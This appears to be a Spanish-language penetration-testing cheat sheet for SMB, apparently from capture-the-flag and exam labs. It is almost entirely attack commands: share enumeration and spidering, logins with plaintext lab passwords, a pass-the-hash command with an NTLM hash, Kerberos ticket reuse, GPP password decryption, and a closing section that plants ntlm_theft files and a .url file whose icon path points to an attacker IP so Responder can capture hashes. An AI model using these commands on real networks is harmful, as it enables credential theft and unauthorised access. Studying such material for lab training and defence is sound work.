
```bash
netexec smb $IP
```

- Añadimos su dominio con la IP al `/etc/hosts` 

```bash
crackmapexec smb $IP --shares
nxc smb ips -u eturner -p passwd --shares -M spider_plus -o DOWNLOAD_FLAG=True  OUTPUT_FOLDER=.


smbmap -H 10.10.10.175
smbmap -H 10.10.10.175 -u "null"
smbmap -H 10.10.10.175 -u "null" -r Dir


smbclient -L 10.10.10.175 -N
smbclient //192.168.232.141/setup -U 'oscp.exam\Eric.Wallows'
smbclient //10.10.11.51/Users -U 'rose' --password 'KxEPkKe6R8su'
smbclient //10.10.11.152/Shares -N

prompt off
get archivo
recurse ON
mget * 
```

## Groups.xml

- Esta en {} -> Preferences -> Groups 
```bash
gpp-decrypt cpassword
```

## HASH

```bash
smbclient.py -hashes ':2a572c5e5ffe107ca30f260b97843d94' Administrator@172.17.0.34
```

## Kerberos

```bash
KRB5CCNAME=ryan.naylor.ccache smbclient.py -k DC.VOLEUR.HTB

USE $RECURSO

ls
```

## CLonar por CIFS

```bash
mkdir /mnt/smbmounted

mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw

umount /mnt/smbmounted
```

## PERMISOS WRITE

```bash
https://github.com/Greenwolf/ntlm_theft
#Pon tu IP
python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
#Conectas donde tengas los archivos
#Responder
prompt off

mput * 
```

- O si no probar
```bash
[InternetShortcut]
URL=http://10.10.14.20/a/share.html
IconIndex=1
IconFile=\\10.10.14.20\x\share.ico

#Responder -I tun0 (aun con ligolo)
```
